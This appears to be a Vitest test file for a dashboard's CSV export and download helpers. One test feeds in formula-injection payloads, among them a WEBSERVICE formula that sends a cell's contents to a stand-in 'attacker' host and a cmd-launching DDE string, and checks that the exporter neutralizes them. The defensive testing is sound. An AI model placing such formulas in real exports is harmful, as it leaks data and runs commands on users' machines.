import { afterEach, describe, expect, it, vi } from "vitest";

import { buildCsv, downloadCsv, type CsvColumn } from "../../src/lib/dashboard/csv-export";

type Row = { email: string | null; name: string; total: number };

const columns: readonly CsvColumn<Row>[] = [
  { header: "Customer", value: (row) => row.name },
  { header: "Email", value: (row) => row.email },
  { header: "Total", value: (row) => row.total },
];

describe("buildCsv", () => {
  it("renders a header row followed by one line per row with CRLF separators", () => {
    const csv = buildCsv<Row>(
      [
        { email: "buyer@example.com", name: "Ada", total: 1200 },
        { email: null, name: "Bình", total: 0 },
      ],
      columns,
    );
    expect(csv).toBe("Customer,Email,Total\r\nAda,buyer@example.com,1200\r\nBình,,0");
  });

  it("escapes quotes, commas, and newlines by wrapping cells in double quotes", () => {
    const csv = buildCsv<Row>(
      [{ email: null, name: 'Acme, "Best" Co.\nSecond line', total: 5 }],
      columns,
    );
    expect(csv).toBe('Customer,Email,Total\r\n"Acme, ""Best"" Co.\nSecond line",,5');
  });

  it("escapes header cells with the same rules", () => {
    const csv = buildCsv<Row>([], [{ header: 'Header, "quoted"', value: () => "" }]);
    expect(csv).toBe('"Header, ""quoted"""');
  });

  it("neutralizes spreadsheet formula injection in attacker-controlled cells", () => {
    const csv = buildCsv<Row>(
      [
        { email: null, name: "=WEBSERVICE(\"http://attacker/?\"&A1)", total: 1 },
        { email: null, name: "+cmd|' /C calc'!A1", total: 2 },
        { email: null, name: "-2+3", total: 3 },
        { email: null, name: "@HYPERLINK(\"http://attacker\")", total: 4 },
      ],
      columns,
    );
    const lines = csv.split("\r\n");
    expect(lines[1]).toContain("'=WEBSERVICE");
    expect(lines[2]).toContain("'+cmd");
    expect(lines[3]).toContain("'-2+3");
    expect(lines[4]).toContain("'@HYPERLINK");
    // No exported cell may still start with a formula trigger character.
    for (const line of lines.slice(1)) {
      expect(line.startsWith("=")).toBe(false);
      expect(line.startsWith("+")).toBe(false);
      expect(line.startsWith("-")).toBe(false);
      expect(line.startsWith("@")).toBe(false);
    }
  });

  it("keeps inline dashes untouched but guards leading-dash cells", () => {
    const csv = buildCsv<Row>([{ email: null, name: "non-formula - dash", total: -5 }], columns);
    expect(csv).toBe("Customer,Email,Total\r\nnon-formula - dash,,'-5");
  });

  it("serializes empty rows to a header-only document", () => {
    expect(buildCsv<Row>([], columns)).toBe("Customer,Email,Total");
  });
});

describe("downloadCsv", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it("prefixes the BOM so spreadsheet apps detect UTF-8 and triggers an anchor download", () => {
    let blobContent: string | null = null;
    let blobType: string | null = null;
    const FakeBlob = function (this: unknown, parts: readonly BlobPart[], options?: BlobPropertyBag): void {
      blobContent = (parts as readonly string[]).join("");
      blobType = options?.type ?? null;
    } as unknown as typeof Blob;
    const anchor = { click: vi.fn(), download: "", href: "" };
    vi.stubGlobal("Blob", FakeBlob);
    vi.stubGlobal("document", { createElement: vi.fn(() => anchor) });
    const createObjectURL = vi.fn(() => "blob:selinow-test");
    const revokeObjectURL = vi.fn();
    vi.stubGlobal("URL", { createObjectURL, revokeObjectURL });

    downloadCsv("orders-20260815.csv", "Customer,Email\r\nAda,a@example.com");

    expect(blobContent).toBe("\uFEFFCustomer,Email\r\nAda,a@example.com");
    expect(blobType).toBe("text/csv;charset=utf-8;");
    expect(anchor.download).toBe("orders-20260815.csv");
    expect(anchor.href).toBe("blob:selinow-test");
    expect(anchor.click).toHaveBeenCalledTimes(1);
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:selinow-test");
  });
});
